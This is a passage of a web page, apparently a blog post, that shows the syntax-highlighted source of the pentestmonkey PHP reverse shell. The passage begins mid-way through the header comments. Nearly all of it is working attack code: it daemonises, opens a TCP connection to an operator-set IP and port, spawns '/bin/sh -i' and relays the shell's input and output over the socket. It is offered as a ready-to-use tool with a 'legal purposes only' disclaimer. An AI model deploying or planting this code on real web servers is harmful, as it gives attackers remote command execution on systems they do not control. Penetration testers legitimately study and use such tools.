applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; <span class="keyword">if</span> not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, <span class="keyword">then</span> <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and <span class="built_in">return</span> FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed <span class="keyword">for</span> daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell <span class="keyword">if</span> you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 1234;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself <span class="keyword">if</span> possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">	// Fork and have the parent process <span class="built_in">exit</span></span><br><span class="line">	<span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">		printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(1);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(0);  // Parent exits</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Make the current process a session leader</span><br><span class="line">	// Will only succeed <span class="keyword">if</span> we forked</span><br><span class="line">	<span class="keyword">if</span> (posix_setsid() == -1) &#123;</span><br><span class="line">		printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$daemon</span> = 1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line"><span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Remove any <span class="built_in">umask</span> we inherited</span><br><span class="line"><span class="built_in">umask</span>(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">	printit(<span class="string">&quot;<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="built_in">read</span> from</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">	printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">	// Check for end of TCP connection</span></span><br><span class="line"><span class="string">	if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">		printit(&quot;ERROR: Shell connection terminated&quot;);</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Check for end of STDOUT</span></span><br><span class="line"><span class="string">	if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">		printit(&quot;ERROR: Shell process terminated&quot;);</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">	// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">	$read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">	// data to process&#x27;</span>s STDIN</span><br><span class="line">	<span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">		fwrite(<span class="variable">$pipes</span>[0], <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// If we can <span class="built_in">read</span> from the process<span class="string">&#x27;s STDOUT</span></span><br><span class="line"><span class="string">	// send data down tcp connection</span></span><br><span class="line"><span class="string">	if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit(&quot;STDOUT READ&quot;);</span></span><br><span class="line"><span class="string">		$input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit(&quot;STDOUT: $input&quot;);</span></span><br><span class="line"><span class="string">		fwrite($sock, $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the process&#x27;</span>s STDERR</span><br><span class="line">	// send data down tcp connection</span><br><span class="line">	<span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[2], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[2], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">		fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[2]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">// Like <span class="built_in">print</span>, but does nothing <span class="keyword">if</span> we<span class="string">&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="string">// (I can&#x27;</span>t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line"><span class="keyword">function</span> printit (<span class="variable">$string</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;<span class="variable">$string</span>\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
 
       
     </div>
